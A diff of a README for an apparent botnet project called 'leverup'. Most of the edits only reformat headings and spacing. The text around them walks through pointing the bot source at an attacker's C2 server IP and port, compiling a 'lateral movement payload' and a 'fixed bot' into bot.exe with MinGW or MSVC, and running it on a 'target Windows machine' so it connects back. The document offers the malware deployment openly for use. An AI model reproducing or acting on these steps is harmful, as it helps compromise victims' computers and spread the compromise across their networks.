@@ -41,9 +41,9 @@
     cd leverup
 
 
-#### 3. **Install the required Python packages:**
+#### 2. **Install the required Python packages:**
 
-   ```bash
+    ```bash
    
     pip install -r requirements.txt
 
@@ -69,16 +69,17 @@ The payload/ directory contains various C++ bot implementations:
 
     leverup_bot_fixed.cpp – the stable, fixed bot version
 
-1. **Configure the Bot**
+#### 1. **Configure the Bot**
 
 In the payload source code (e.g., with_LM.cpp or leverup_bot_fixed.cpp), update the C2 server address:
 cpp
 
 // Update these lines
 std::string C2_SERVER_IP = "YOUR_SERVER_IP";
+
 int C2_SERVER_PORT = 8080;
 
-2. **Compile the Bot**
+#### 2. **Compile the Bot**
 
 You can compile using MinGW (g++) or MSVC (Visual Studio).
 
@@ -87,11 +88,13 @@ You can compile using MinGW (g++) or MSVC (Visual Studio).
 Open a terminal (MSYS2, Cygwin, or WSL) and run:
 
 For lateral movement payload:
+      
     ```bash
 
     g++ -O2 -std=c++11 payload/with_LM.cpp -o bot.exe -lws2_32 -liphlpapi -lmpr -ladvapi32 -lshell32 -luser32 -static
 
 For the fixed bot:
+   
     ```bash
 
     g++ -O2 -std=c++11 leverup_bot_fixed.cpp -o bot.exe -lws2_32 -liphlpapi -lmpr -ladvapi32 -lshell32 -luser32 -static
@@ -101,11 +104,12 @@ For the fixed bot:
 ### 🔧 Option B: MSVC (Visual Studio)
 
 Using the Developer Command Prompt for Visual Studio:
+    
     ```bash
 
     cl /EHsc lever-up.cpp ws2_32.lib user32.lib advapi32.lib shell32.lib
 
-3. **Run the Bot**
+#### 3. **Run the Bot**
 
 Execute the generated bot.exe on the target Windows machine. The bot will attempt to connect to your C2 server.
 
